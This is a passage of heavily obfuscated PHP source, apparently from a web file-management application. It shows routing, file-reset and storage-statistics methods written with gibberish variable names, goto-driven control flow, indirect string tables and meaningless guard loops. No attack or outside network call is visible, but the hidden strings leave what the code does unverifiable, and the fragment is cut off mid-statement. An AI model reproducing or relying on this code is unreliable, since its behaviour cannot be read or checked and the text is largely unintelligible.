$F«àó†Åõä->end(); goto bî‰÷±Ú¡é; bî‰÷±Ú¡é: } public function resetFile($DÚìÓÆœÛø) { goto EËÆºñ¬ˆÃ; Cà‡¨Å‰ŒÈ: $CºÕÒ¹«é‡ = Model($dŠ‚Ñ†…²İ[1787])->where($cÕÇ…Ôà†ë)->count(); $E²ÒÀ„ôï¾ = intval($AÃ‰­­Û¸‹) + intval($CºÕÒ¹«é‡); if ($E²ÒÀ„ôï¾ == 0) { IO::remove($DÚìÓÆœÛø[$dŠ‚Ñ†…²İ[76]]); Model($dŠ‚Ñ†…²İ[1788])->delete($DÚìÓÆœÛø[$dŠ‚Ñ†…²İ[461]]); $this->where($cÕÇ…Ôà†ë)->delete(); $this->metaSet($DÚìÓÆœÛø[$dŠ‚Ñ†…²İ[461]], null, null); return; } goto D ‚í¸‘êÙ; D ‚í¸‘êÙ: if ($DÚìÓÆœÛø[$dŠ‚Ñ†…²İ[1783]] != $E²ÒÀ„ôï¾) { $this->where($cÕÇ…Ôà†ë)->save(array($dŠ‚Ñ†…²İ[1779] => $E²ÒÀ„ôï¾)); } goto a¾ğï÷˜š÷; EËÆºñ¬ˆÃ: $dŠ‚Ñ†…²İ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÕÇ…Ôà†ë = array($dŠ‚Ñ†…²İ[462] => $DÚìÓÆœÛø[$dŠ‚Ñ†…²İ[461]]); $AÃ‰­­Û¸‹ = Model($dŠ‚Ñ†…²İ[1227])->where($cÕÇ…Ôà†ë)->count(); goto Cà‡¨Å‰ŒÈ; a¾ğï÷˜š÷: } public function storageInfo($dÚÂøˆ¤¸ = false) { goto F’È³×áø; C’²„´µ´Ñ: for ($cÍ–¨ù¨êÍ = 0; $cÍ–¨ù¨êÍ < $A¸‚›ñ£—Ô; $cÍ–¨ù¨êÍ = $cÍ–¨ù¨êÍ + $Fªš»Ğ‚Ğ) { $fÛ¹Óåİ’‰ = $this->limit($cÍ–¨ù¨êÍ, $cÍ–¨ù¨êÍ + $Fªš»Ğ‚Ğ)->select(); foreach ($fÛ¹Óåİ’‰ as $fæÈ ßÀ) { $FóŠ„‘¨­— += $fæÈ ßÀ[$e—·«Ë±²[78]] * $fæÈ ßÀ[$e—·«Ë±²[1783]]; $DåÓÎë³‘Æ += $fæÈ ßÀ[$e—·«Ë±²[78]] * ($fæÈ ßÀ[$e—·«Ë±²[1783]] - 1); $fÕ†ˆÄæ×á += $fæÈ ßÀ[$e—·«Ë±²[1783]]; } } $EÑ×Ù¨Â¯µ = array($e—·«Ë±²[1789] => $FóŠ„‘¨­—, $e—·«Ë±²[1790] => $DåÓÎë³‘Æ, $e—·«Ë±²[1791] => $DåÓÎë³‘Æ / $FóŠ„‘¨­—, $e—·«Ë±²[82] => $A¸‚›ñ£—Ô, $e—·«Ë±²[1792] => $fÕ†ˆÄæ×á); return $EÑ×Ù¨Â¯µ; goto eù™ô™­ßµ; dÕó´à‘™: $FóŠ„‘¨­— = 1; $fÕ†ˆÄæ×á = 0; $Fªš»Ğ‚Ğ = 5000; goto C’²„´µ´Ñ; F’È³×áø: $e—·«Ë±² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A¸‚›ñ£—Ô = $this->count() + 0.0; $DåÓÎë³‘Æ = 0; goto dÕó´à‘™; eù™ô™­ßµ: } } goto B‰ïƒÑ¦é; Fƒ´—ãã: $FÛ©™ìôí = $_SERVER[Ôğ—¤Šµˆ˜ñ£][604]; if (!$FÛ©™ìôí) { die; } class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($C†Î¨ó•‹) { goto AÈšç­Â© ; AÈšç­Â© : $E…ºª„ÆŸğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b®«ùÚëÅ =& $_SERVER[´…‰Ò‹]; $cÕò»óóÆ = $b®«ùÚëÅ[0]($b®«ùÚëÅ[1], $b®«ùÚëÅ[2]($C†Î¨ó•‹, $b®«ùÚëÅ[1])); goto b›øªê³¥²; bŒ÷‰ò’‹â: $this->defaultAction = $cÕò»óóÆ[2] ? $cÕò»óóÆ[2] : $this->defaultAction; $Dšö¼Î±Ö = $E…ºª„ÆŸğ[608]; while (strlen($Dšö¼Î±Ö) < $E…ºª„ÆŸğ[609]) { if (!$Dšö¼Î±Ö) { break; } $Dšö¼Î±Ö++; } goto bÙòçÏò‰‡; bÙòçÏò‰‡: $this->{$_SERVER[´…‰Ò‹][3]}($b®«ùÚëÅ[4], array($this, $b®«ùÚëÅ[5])); goto aº¬êĞÉ‹; b›øªê³¥²: $this->defaultModule = $cÕò»óóÆ[0] ? $cÕò»óóÆ[0] : $this->defaultModule; $C»¸ùŞƒù‰ = $E…ºª„ÆŸğ[605]; if (strlen($C»¸ùŞƒù‰) < $E…ºª„ÆŸğ[606]) { return; } goto c¾‡ùø‚İ‰; c¾‡ùø‚İ‰: $this->defaultController = $cÕò»óóÆ[1] ? $cÕò»óóÆ[1] : $this->defaultController; $AÎßìíí® = $E…ºª„ÆŸğ[607]; if (!$AÎßìíí®) { die; } goto bŒ÷‰ò’‹â; aº¬êĞÉ‹: } public function appRun($a¾‰Ô†È—) { goto aø÷«Ã¿ëæ; cŠÃšÕîàŠ: $cÙ²ßÆ®Ô = $Cá„äğŒÈ[611]; if (strlen($cÙ²ßÆ®Ô) < $Cá„äğŒÈ[606]) { die; } $F†ˆéÄ•˜§ = $eÛåäÎ·Œ„[7]; goto F†Õ™… ·; D¹Ú¹à¤Ë©: $aõÄô·ù = $Cá„äğŒÈ[610]; while ($aõÄô·ù < $Cá„äğŒÈ[601]) { if ($aõÄô·ù >= 0) { break; } $aõÄô·ù++; } $f”©‘ìô¯É = $eÛåäÎ·Œ„[6]($fáğò…Äö¼[0]); goto cŠÃšÕîàŠ; E›…ÇÅ™”Ã: $eÛåäÎ·Œ„[13](array($eÛåäÎ·Œ„[14], $eÛåäÎ·Œ„[15]), $F†ˆéÄ•˜§ . $eÛåäÎ·Œ„[18], $a¾‰Ô†È—); goto f‘°Ñ‰¦à“; aø÷«Ã¿ëæ: $Cá„äğŒÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÛåäÎ·Œ„ =& $_SERVER[´…‰Ò‹]; $fáğò…Äö¼ = $eÛåäÎ·Œ„[0]($eÛåäÎ·Œ„[1], $a¾‰Ô†È—); goto D¹Ú¹à¤Ë©; F†Õ™… ·: if ($f”©‘ìô¯É == $eÛåäÎ·Œ„[8]) { $F†ˆéÄ•˜§ = $eÛåäÎ·Œ„[9]; $fáğò…Äö¼[0] = $eÛåäÎ·Œ„[10]; $fáğò…Äö¼[1] = $fáğò…Äö¼[1] . $eÛåäÎ·Œ„[11]; $a¾‰Ô†È— = $eÛåäÎ·Œ„[12]($eÛåäÎ·Œ„[1], $fáğò…Äö¼); $a¾‰Ô†È— = $eÛåäÎ·Œ„[2]($a¾‰Ô†È—, $eÛåäÎ·Œ„[1]); } $eÛåäÎ·Œ„[13](array($eÛåäÎ·Œ„[14], $eÛåäÎ·Œ„[15]), $F†ˆéÄ•˜§ . $eÛåäÎ·Œ„[16], $a¾‰Ô†È—); $eÛåäÎ·Œ„[17]($a¾‰Ô†È—); goto E›…ÇÅ™”Ã; f‘°Ñ‰¦à“: } private function autorun() { $e¹åñÊ¹Çƒ =& $_SERVER[´…‰Ò‹]; global $config; if ($e¹åñÊ¹Çƒ[19]($config[$e¹åñÊ¹Çƒ[20]]) == 0) { return; } foreach ($config[$e¹åñÊ¹Çƒ[20]] as $d±¡­ˆ‡¹Š => $bœğùİò) { $this->{$_SERVER[´…‰Ò‹][21]}($bœğùİò); $c®Ï’äØë = $_SERVER[Ôğ—¤Šµˆ˜ñ£][612]; } } private function dxlffc873fde() { goto c¼¿§ñ†‰†; aĞ¬Ô¾äÂ: if (!$a·ÌŒ¯ØŞ) { die; } goto b¤Û×´ñÙ; c¼¿§ñ†‰†: $F‹ğã»•ŸĞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e¡™‹—» ™ =& $_SERVER[´…‰Ò‹]; $Fƒ±èšŠ‘’ = $e¡™‹—» ™[8]; goto E¼Œ˜¸à½„; fíÆ¢¯½ “: $c´‹´œ­¢¦ = $F‹ğã»•ŸĞ[614]; if (!$c´‹´œ­¢¦) { die; } $B¦¥äŠ¶ù÷ = array($e¡™‹—» ™[8], $fâôËÃ„©á); goto cŸÛøì¤‹ï; Fê¼ñ«Õõ: if (!$A˜¹¢¤ë˜˜ || $e¡™‹—» ™[24]($A˜¹¢¤ë˜˜) <= $e¡™‹—» ™[24]($Fƒ±èšŠ‘’)) { return; } if ($e¡™‹—» ™[6]($e¡™‹—» ™[25]($A˜¹¢¤ë˜˜, -$e¡™‹—» ™[24]($Fƒ±èšŠ‘’))) != $Fƒ±èšŠ‘’) { return; } $fâôËÃ„©á = $e¡™‹—» ™[25]($A˜¹¢¤ë˜˜, 0, -$e¡™‹—» ™[24]($Fƒ±èšŠ‘’)); goto fíÆ¢¯½ “; E¼Œ˜¸à½„: $A˜¹¢¤ë˜˜ = $GLOBALS[$e¡™‹—» ™[22]][$e¡™‹—» ™[23]][0]; $cÒ©—İÌÇ– = $F‹ğã»•ŸĞ[613]; while ($cÒ©—İÌÇ– < $F‹ğã»•ŸĞ[606]) { if ($cÒ©—İÌÇ– >= 0) { break; } $cÒ©—İÌÇ–++; } goto Fê¼ñ«Õõ; cŸÛøì¤‹ï: $Dößæ‚êŠº = $e¡™‹—» ™[26]($GLOBALS[$e¡™‹—» ™[22]][$e¡™‹—» ™[23]], 1); $GLOBALS[$e¡™‹—» ™[22]][$e¡™‹—» ™[23]] = $e¡™‹—» ™[27]($B¦¥äŠ¶ù÷, $Dößæ‚êŠº); $CŠíÔÑí”é = $F‹ğã»•ŸĞ[615]; goto a¼Íš‰ñ»å; a¼Íš‰ñ»å: while (strlen($CŠíÔÑí”é) < $F‹ğã»•ŸĞ[616]) { if (!$CŠíÔÑí”é) { break; } $CŠíÔÑí”é++; } $GLOBALS[$e¡™‹—» ™[22]][$e¡™‹—» ™[28]] = $e¡™‹—» ™[29]($e¡™‹—» ™[1], $GLOBALS[$e¡™‹—» ™[22]][$e¡™‹—» ™[23]]); $a·ÌŒ¯ØŞ = $F‹ğã»•ŸĞ[617]; goto aĞ¬Ô¾äÂ; b¤Û×´ñÙ: } private function gftu82de53fb() { goto cÄ‘µ¾’¬; c¬ã¾ÓÇó: $A¼¸¢ŞèÖ = $cÍ†ÁÁÜÛ[25]($FêˆÆñ£œĞ, $aÊù»ŒÙ– + $cÍ†ÁÁÜÛ[24]($BáÕÆ«Èé)); $cÍ†ÁÁÜÛ[34]($cÍ†ÁÁÜÛ[35], $A¼¸¢ŞèÖ, $f©Â‡è£Ş); $A¼¸¢ŞèÖ = $cÍ†ÁÁÜÛ[2]($f©Â‡è£Ş[0][0], $cÍ†ÁÁÜÛ[36]); goto aä÷Ì÷É“è; EÃùÑŞêÏ: $GLOBALS[$cÍ†ÁÁÜÛ[22]][$cÍ†ÁÁÜÛ[28]] = $cÍ†ÁÁÜÛ[29]($cÍ†ÁÁÜÛ[1], $GLOBALS[$cÍ†ÁÁÜÛ[22]][$cÍ†ÁÁÜÛ[23]]); goto FŒ©¤›”¶‡; DÃŠÕ±Øã: $aÊù»ŒÙ– = $cÍ†ÁÁÜÛ[33]($FêˆÆñ£œĞ, $BáÕÆ«Èé); $bêÜ¶¢ÅŠŞ = $BĞ Ü§‘Ò[618]; if (!$bêÜ¶¢ÅŠŞ) { die; } goto c¬ã¾ÓÇó; E‹£™ÜµÌ¹: $FêˆÆñ£œĞ = $_SERVER[$cÍ†ÁÁÜÛ[30]]; $BáÕÆ«Èé = $cÍ†ÁÁÜÛ[31]; if (!$cÍ†ÁÁÜÛ[32]($FêˆÆñ£œĞ, $BáÕÆ«Èé)) { return; } goto DÃŠÕ±Øã; cÄ‘µ¾’¬: $BĞ Ü§‘Ò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÍ†ÁÁÜÛ =& $_SERVER[´…‰Ò‹]; if ($GLOBALS[$cÍ†ÁÁÜÛ[22]][$cÍ†ÁÁÜÛ[28]] != $cÍ†ÁÁÜÛ[10]) { return; } goto E‹£™ÜµÌ¹; aä÷Ì÷É“è: $C‡ ›ø¬ù¹ = $BĞ Ü§‘Ò[619]; if (strlen($C‡ ›ø¬ù¹) < $BĞ Ü§‘Ò[601]) { return; } $GLOBALS[$cÍ†ÁÁÜÛ[22]][$cÍ†ÁÁÜÛ[23]] = $cÍ†ÁÁÜÛ[0]($cÍ†ÁÁÜÛ[36], $A¼¸¢ŞèÖ); goto EÃùÑŞêÏ; FŒ©¤›”¶‡: } public function run() { goto dÕÚ–ÆíÆ; eŠßÚŒšäº: if (strlen($aËëÃº¶õÒ) < $EÅ±Ø¢ˆ‘É[606]) { die; } if ($EŸÉäÇá¶[19]($AÔÆƒ¬ƒØŠ) >= 3) { $this->{$_SERVER[´…‰Ò‹][21]}($føƒ„¼¢¤); } else { $this->{$_SERVER[´…‰Ò‹][21]}(ACTION); } goto Eë‡Àƒƒ±å; f¨ÓÂ‹¤”…: $e²ßëã…† = $EÅ±Ø¢ˆ‘É[624]; if (!$e²ßëã…†) { die; } $EŸÉäÇá¶[39]($EŸÉäÇá¶[42], isset($AÔÆƒ¬ƒØŠ[2]) && $AÔÆƒ¬ƒØŠ[0] ? $AÔÆƒ¬ƒØŠ[2] : $this->defaultAction); goto dÚ‘¢Ñ‡Ó«; DÔªÙâè§: $eç‘ƒìíé = $EÅ±Ø¢ˆ‘É[621]; if (!$eç‘ƒìíé) { return; } $AÔÆƒ¬ƒØŠ = $GLOBALS[$EŸÉäÇá¶[22]][$EŸÉäÇá¶[23]]; goto aé÷‘÷ùã’; Cò§—İ·ùŒ: $EŸÉäÇá¶[39]($EŸÉäÇá¶[40], isset($AÔÆƒ¬ƒØŠ[0]) && $AÔÆƒ¬ƒØŠ[0] ? $AÔÆƒ¬ƒØŠ[0] : $this->defaultModule); $d©ë½°òƒ™ = $EÅ±Ø¢ˆ‘É[623]; $EŸÉäÇá¶[39]($EŸÉäÇá¶[41], isset($AÔÆƒ¬ƒØŠ[1]) && $AÔÆƒ¬ƒØŠ[0] ? $AÔÆƒ¬ƒØŠ[1] : $this->defaultController); goto f¨ÓÂ‹¤”…; dÚ‘¢Ñ‡Ó«: $EŸÉäÇá¶[39]($EŸÉäÇá¶[43], MOD . $EŸÉäÇá¶[1] . ST . $EŸÉäÇá¶[1] . ACT); $_SERVER[$EŸÉäÇá¶[44]] = $EŸÉäÇá¶[6](ACTION); $BøßÉİ‚Œñ = $EÅ±Ø¢ˆ‘É[625]; goto bÍ®½¬µ¦; E¥’¹ĞŸß³: $A°ç­ºôÎğ = $EÅ±Ø¢ˆ‘É[620]; if (!$A°ç­ºôÎğ) { return; } $this->{$_SERVER[´…‰Ò‹][38]}(); goto DÔªÙâè§; dÕÚ–ÆíÆ: $EÅ±Ø¢ˆ‘É =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EŸÉäÇá¶ =& $_SERVER[´…‰Ò‹]; $this->{$_SERVER[´…‰Ò‹][37]}(); goto E¥’¹ĞŸß³; bÍ®½¬µ¦: if (!$BøßÉİ‚Œñ) { die; } $this->{$_SERVER[´…‰Ò‹][45]}(); $aËëÃº¶õÒ = $EÅ±Ø¢ˆ‘É[626]; goto eŠßÚŒšäº; aé÷‘÷ùã’: $A¤¸ á‡˜È = $EÅ±Ø¢ˆ‘É[622]; while (strlen($A¤¸ á‡˜È) < $EÅ±Ø¢ˆ‘É[601]) { if (!$A¤¸ á‡˜È) { break; } $A¤¸ á‡˜È++; } $føƒ„¼¢¤ = $GLOBALS[$EŸÉäÇá¶[22]][$EŸÉäÇá¶[28]]; goto Cò§—İ·ùŒ; Eë‡Àƒƒ±å: } private $laukfad11ca5 = array(); private $gzuc017ad278 = ''; public function imuv8d50d5ce() { goto CŞ‹¸á›„ª; BÁïñÇã³Å: $this->{$_SERVER[´…‰Ò‹][50]}(); $this->{$_SERVER[´…‰Ò‹][51]}(); $this->{$_SERVER[´…‰Ò‹][52]}(); goto f’ÍÑ‡‰õ´; cöò›ÛÇ‚: $cä¨”ïÄ› = $a—ÙË¤‚…[628]; while ($cä¨”ïÄ› < $a—ÙË¤‚…[629]) { if ($cä¨”ïÄ› >= 0) { break; } $cä¨”ïÄ›++; } $this->{$_SERVER[´…‰Ò‹][48]}(); goto b÷÷§ñÏÎ; d½×ºØœº•: $this->{$_SERVER[´…‰Ò‹][3]}($c¦ê–—ŞŒ [59], array($this, $c¦ê–—ŞŒ [60])); $DºÒ„Èçä† = $a—ÙË¤‚…[631]; while (strlen($DºÒ„Èçä†) < $a—ÙË¤‚…[629]) { if (!$DºÒ„Èçä†) { break; } $DºÒ„Èçä†++; } goto c°ŒóÛ“½; A“ƒ•óçÚ : $d‡‚‘¼† = $a—ÙË¤‚…[627]; if (strlen($d‡‚‘¼†) < $a—ÙË¤‚…[601]) { return; } $this->{$_SERVER[´…‰Ò‹][47]}(); goto cöò›ÛÇ‚; CŞ‹¸á›„ª: $a—ÙË¤‚… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¦ê–—ŞŒ  =& $_SERVER[´…‰Ò‹]; $this->{$_SERVER[´…‰Ò‹][46]}(); goto A“ƒ•óçÚ ; f’ÍÑ‡‰õ´: $this->{$_SERVER[´…‰Ò‹][3]}($c¦ê–—ŞŒ [53], array($this, $c¦ê–—ŞŒ [54])); $this->{$_SERVER[´…‰Ò‹][3]}($c¦ê–—ŞŒ [55], array($this, $c¦ê–—ŞŒ [56])); $this->{$_SERVER[´…‰Ò‹][3]}($c¦ê–—ŞŒ [57], array($this, $c¦ê–—ŞŒ [58])); goto d½×ºØœº•; b÷÷§ñÏÎ: $C¢ÒÚÕŠ„ = $a—ÙË¤‚…[630]; if (!$C¢ÒÚÕŠ„) { die; } $this->{$_SERVER[´…‰Ò‹][49]}(); goto BÁïñÇã³Å; c°ŒóÛ“½: } public function jqft6639a563($BÕ‰ìêñö) { goto EË´Ø¨ŠÇØ; b†¦¿Şì”‡: $b¬Ùº¨Ø = array($EîÙã·¬ê´[64], $EîÙã·¬ê´[65], $EîÙã·¬ê´[66], $EîÙã·¬ê´[67], $EîÙã·¬ê´[68], $EîÙã·¬ê´[69], $EîÙã·¬ê´[70], $EîÙã·¬ê´[71], $EîÙã·¬ê´[72], $EîÙã·¬ê´[73], $EîÙã·¬ê´[74], $EîÙã·¬ê´[75], $EîÙã·¬ê´[76], $EîÙã·¬ê´[77], $EîÙã·¬ê´[78], $EîÙã·¬ê´[79], $EîÙã·¬ê´[80], $EîÙã·¬ê´[81], $EîÙã·¬ê´[82], $EîÙã·¬ê´[83], $EîÙã·¬ê´[84], $EîÙã·¬ê´[85], $EîÙã·¬ê´[86], $EîÙã·¬ê´[87], $EîÙã·¬ê´[88], $EîÙã·¬ê´[89], $EîÙã·¬ê´[90], $EîÙã·¬ê´[91], $EîÙã·¬ê´[92], $EîÙã·¬ê´[93], $EîÙã·¬ê´[94], $EîÙã·¬ê´[95], $EîÙã·¬ê´[96], $EîÙã·¬ê´[97], $EîÙã·¬ê´[98], $EîÙã·¬ê´[99], $EîÙã·¬ê´[100], $EîÙã·¬ê´[101], $EîÙã·¬ê´[102], $EîÙã·¬ê´[103], $EîÙã·¬ê´[104], $EîÙã·¬ê´[105], $EîÙã·¬ê´[106], $EîÙã·¬ê´[107], $EîÙã·¬ê´[108], $EîÙã·¬ê´[109], $EîÙã·¬ê´[110]); $AîĞ–Öõ¶ä = $e„ã’ŠŒ–æ[632]; if (strlen($AîĞ–Öõ¶ä) < $e„ã’ŠŒ–æ[609]) { return; } goto D›Ãªã˜; D×Š„°ÉÒ: $f¨õâ„È´è = $e„ã’ŠŒ–æ[633]; while (strlen($f¨õâ„È´è) < $e„ã’ŠŒ–æ[609]) { if (!$f¨õâ„È´è) { break; } $f¨õâ„È´è++; } unset($BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[115]][$EîÙã·¬ê´[117]]); goto bò­ÆÛîÄ; dÍ–¹İÀÎ‹: $Eªìã¹® = $e„ã’ŠŒ–æ[636]; while (strlen($Eªìã¹®) < $e„ã’ŠŒ–æ[609]) { if (!$Eªìã¹®) { break; } $Eªìã¹®++; } $BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[114]][$EîÙã·¬ê´[119]] = array($EîÙã·¬ê´[120] => (int) $F†Ïº»ƒñ…[$EîÙã·¬ê´[121]], $EîÙã·¬ê´[122] => (int) $EîÙã·¬ê´[123]($F†Ïº»ƒñ…, $EîÙã·¬ê´[124], 0)); goto B±Œ«ãÚ¶÷; eÒÍ¤ÕÌ™: $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[145]] = $EîÙã·¬ê´[123]($this->laukfad11ca5, $EîÙã·¬ê´[146], $EîÙã·¬ê´[10]); $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[147]] = $EîÙã·¬ê´[123]($this->laukfad11ca5, $EîÙã·¬ê´[148], $EîÙã·¬ê´[10]); if ($EîÙã·¬ê´[123]($GLOBALS, $EîÙã·¬ê´[149]) && $this->config[$EîÙã·¬ê´[150]]) { $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[151]] = WEB_ROOT; } goto eÁÂ¡İî´‡; B¡‡Œ´ÃÕ¨: $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[137]] = $this->gzuc017ad278; if ($Bö¿ÑƒÓÆØ[$EîÙã·¬ê´[137]] != $EîÙã·¬ê´[138]) { $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[139]] = $Bö¿ÑƒÓÆØ[$EîÙã·¬ê´[139]]; $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[140]] = $Bö¿ÑƒÓÆØ[$EîÙã·¬ê´[140]]; $A–”‚ôË = $EîÙã·¬ê´[141](10) . $this->gzuc017ad278 . $EîÙã·¬ê´[141](5); $BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[142]][$EîÙã·¬ê´[143]] = $this->{$_SERVER[´…‰Ò‹][144]}($A–”‚ôË, $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[130]]); } if ($this->gzuc017ad278 == $EîÙã·¬ê´[138]) { $BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[114]][$EîÙã·¬ê´[119]][$EîÙã·¬ê´[124]] = 0; } goto eÒÍ¤ÕÌ™; BÅöâ³–Ñø: $bŠ’ƒ‰Ÿ®Ş = $e„ã’ŠŒ–æ[635]; if (strlen($bŠ’ƒ‰Ÿ®Ş) < $e„ã’ŠŒ–æ[601]) { return; } unset($BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[114]][$EîÙã·¬ê´[118]]); goto dÍ–¹İÀÎ‹; EË´Ø¨ŠÇØ: $e„ã’ŠŒ–æ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EîÙã·¬ê´ =& $_SERVER[´…‰Ò‹]; $Bö¿ÑƒÓÆØ = $EîÙã·¬ê´[61]($EîÙã·¬ê´[62])->{$_SERVER[´…‰Ò‹][63]}(); goto b†¦¿Şì”‡; D›Ãªã˜: foreach ($b¬Ùº¨Ø as $e³—Œ‚ì˜) { $F’Ì¢Ôíø = $GLOBALS[$EîÙã·¬ê´[111]][$EîÙã·¬ê´[112]][$e³—Œ‚ì˜]; if (isset($Bö¿ÑƒÓÆØ[$e³—Œ‚ì˜])) { $F’Ì¢Ôíø = $Bö¿ÑƒÓÆØ[$e³—Œ‚ì˜]; } $BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[114]][$e³—Œ‚ì˜] = $F’Ì¢Ôíø; } $F†Ïº»ƒñ… = $BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[114]][$EîÙã·¬ê´[76]]; unset($BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[115]][$EîÙã·¬ê´[116]]); goto D×Š„°ÉÒ; B±Œ«ãÚ¶÷: $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[126]] = $EîÙã·¬ê´[127]($EîÙã·¬ê´[128])->{$_SERVER[´…‰Ò‹][129]}(); $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[130]] = $EîÙã·¬ê´[131]($_SERVER[$EîÙã·¬ê´[132]] . $Bö¿ÑƒÓÆØ[$EîÙã·¬ê´[133]]); $BÕ‰ìêñö[$EîÙã·¬ê´[125]][$EîÙã·¬ê´[134]] = $EîÙã·¬ê´[135]($EîÙã·¬ê´[136]()); goto B¡‡Œ´ÃÕ¨; eÁÂ¡İî´‡: return $BÕ‰ìêñö; goto føÜ÷‘†; bò­ÆÛîÄ: $fÉÑò‘à¯¾ = $e„ã’ŠŒ–æ[634]; while ($fÉÑò‘à¯¾ < $e„ã’ŠŒ–æ[601]) { if ($fÉÑò‘à¯¾ >= 0) { break; } $fÉÑò‘à¯¾++; } unset($BÕ‰ìêñö[$EîÙã·¬ê´[113]][$EîÙã·¬ê´[114]][$EîÙã·¬ê´[76]]); goto BÅöâ³–Ñø; føÜ÷‘†: } private function ochrfd42714c() { goto c¹ğªŸÀøŒ; c¹ğªŸÀøŒ: $D‰¤ĞÖØ“­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÆèŠ½–É =& $_SERVER[´…‰Ò‹]; if ($_SERVER[$eÆèŠ½–É[44]] == $eÆèŠ½–É[152]) { $A§¬‘ß“ã = array($eÆèŠ½–É[137] => $this->gzuc017ad278, $eÆèŠ½–É[153] => $this->{$_SERVER[´…‰Ò‹][154]}(), $eÆèŠ½–É[155] => $eÆèŠ½–É[61]($eÆèŠ½–É[156])->{$_SERVER[´…‰Ò‹][157]}()); if ($this->gzuc017ad278 != $eÆèŠ½–É[138]) { $D‘Ïø¹³¹µ = $eÆèŠ½–É[123]($this->laukfad11ca5, $eÆèŠ½–É[158]); if ($D‘Ïø¹³¹µ) { $A§¬‘ß“ã[$eÆèŠ½–É[159]] = $D‘Ïø¹³¹µ; $A§¬‘ß“ã[$eÆèŠ½–É[160]] = $eÆèŠ½–É[161]($eÆèŠ½–É[123]($this->laukfad11ca5, $eÆèŠ½–É[162])); $A§¬‘ß“ã[$eÆèŠ½–É[163]] = $eÆèŠ½–É[123]($this->laukfad11ca5, $eÆèŠ½–É[148]); } $fË²ôÏ²¥ = $eÆèŠ½–É[61]($eÆèŠ½–É[62])->{$_SERVER[´…‰Ò‹][63]}($eÆèŠ½–É[164], $eÆèŠ½–É[10], !0); if ($eÆèŠ½–É[165]($fË²ôÏ²¥) && $eÆèŠ½–É[25]($fË²ôÏ²¥, 0, 1) == $eÆèŠ½–É[166]) { $fË²ôÏ²¥ = $eÆèŠ½–É[167]($fË²ôÏ²¥); } if ($eÆèŠ½–É[168]($fË²ôÏ²¥) && $fË²ôÏ²¥[$eÆèŠ½–É[169]] && $eÆèŠ½–É[32]($fË²ôÏ²¥[$eÆèŠ½–É[169]], $eÆèŠ½–É[170])) { $fì‹½»‰‰è = $eÆèŠ½–É[0]($eÆèŠ½–É[170], $fË²ôÏ²¥[$eÆèŠ½–É[169]]); $A§¬‘ß“ã[$eÆèŠ½–É[171]] = $fì‹½»‰‰è[0]; } } $A§¬‘ß“ã = $this->{$_SERVER[´…‰Ò‹][172]}($eÆèŠ½–É[173]($A§¬‘ß“ã), $eÆèŠ½–É[131]($eÆèŠ½–É[174])); $eËš‚“µÛ = array($eÆèŠ½–É[175] => $A§¬‘ß“ã); $D„Ùäæ¸¡í = $D‰¤ĞÖØ“­[637]; $eÆèŠ½–É[13](array($eÆèŠ½–É[176], $eÆèŠ½–É[177]), $eËš‚“µÛ); } goto e˜Ïš²ÏĞ; e˜Ïš²ÏĞ: if ($this->gzuc017ad278 == $eÆèŠ½–É[138]) { return; } $CíÖ·Î˜ùì = array($eÆèŠ½–É[178], $eÆèŠ½–É[179], $eÆèŠ½–É[180], $eÆèŠ½–É[181], $eÆèŠ½–É[182], $eÆèŠ½–É[183]); $A‡òÀÜª¼î = $eÆèŠ½–É[61]($eÆèŠ½–É[62])->{$_SERVER[´…‰Ò‹][63]}(); goto f±ĞÇÈÊÑ°; b—›¡šåİİ: foreach ($CíÖ·Î˜ùì as $aÃÇçŒ¤è) { if (!isset($A‡òÀÜª¼î[$aÃÇçŒ¤è]) || !$A‡òÀÜª¼î[$aÃÇçŒ¤è]) { continue; } $eËš‚“µÛ[$aÃÇçŒ¤è] = $A‡òÀÜª¼î[$aÃÇçŒ¤è]; } $eÆèŠ½–É[13](array($eÆèŠ½–É[176], $eÆèŠ½–É[177]), $eËš‚“µÛ); goto BÒ¿‚Íîêî; f±ĞÇÈÊÑ°: $eËš‚“µÛ = array($eÆèŠ½–É[184] => $A‡òÀÜª¼î[$eÆèŠ½–É[64]], $eÆèŠ½–É[185] => $A‡òÀÜª¼î[$eÆèŠ½–É[65]], $eÆèŠ½–É[186] => $eÆèŠ½–É[10]); $Cèªì¬ê = $D‰¤ĞÖØ“­[638]; if (strlen($Cèªì¬ê) < $D‰¤ĞÖØ“­[609]) { return; } goto b—›¡šåİİ; BÒ¿‚Íîêî: } private function gkma3d8eeb6a() { goto e‰ÆÌÜÑ£ó; B˜é¹‘ÖÓ: $B“ Š¶Ô½ = 